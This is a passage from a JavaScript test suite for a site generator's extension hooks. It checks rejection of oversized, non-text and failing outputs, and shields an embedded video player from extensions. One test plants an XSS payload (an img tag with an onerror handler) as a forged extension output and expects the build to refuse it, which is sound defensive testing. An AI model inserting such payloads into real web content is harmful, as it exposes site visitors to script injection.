  assert.ok(r.code === 'unsafe-extension-output' || (r.errors && r.errors.length === 0), 'a pipe table is plain text in this format, not an error');
  // oversized and non-text output
  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => 'x'.repeat(1_000_001)), code('extension-failed'));
  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => ({ not: 'text' })), code('extension-failed'));
  await assert.rejects(buildSiteWith({ ...input, extensions: [e.ext] }, async () => { throw new Error('boom'); }), code('extension-failed'));
  // a hostile recorded output in extension-outputs.json is refused at generation, runner or not
  const probe = buildSite({ ...input, extensions: [e.ext] });
  const forged = Object.fromEntries(probe.missing.map((m) => [m.key, { extension: m.extension, hook: m.hook, output: '<img src=x onerror=alert(1)>' }]));
  const hostile = buildSite({ ...input, extensions: [e.ext], outputs: forged });
  assert.ok(hostile.errors.length && hostile.errors.every((x) => x.code === 'unsafe-extension-output'));
  assert.deepEqual(hostile.files, {});
});

test('extensions: our own video embed is protected from them (they see a placeholder, the page keeps the player)', async () => {
  const e = await pinnedExt();
  const input = await exampleInput({ extensions: [e.pin] });
  const seen = [];
  const spy = async ({ extension, hook, ctx, input: html }) => {
    seen.push(html);
    return localRunner({ extension, hook, ctx, input: html });
  };
  const { files } = await buildSiteWith({ ...input, extensions: [e.ext] }, spy);
  const post = files['static-hls-in-git/index.html'];
  assert.ok(post.includes('<iframe src="https://strataeditor.dev/player/#'), 'the player survives');
  assert.ok(seen.some((h) => h.includes('data-slot="v0"')) && !seen.some((h) => h.includes('strataeditor.dev')), 'the extension never sees the player markup');
});
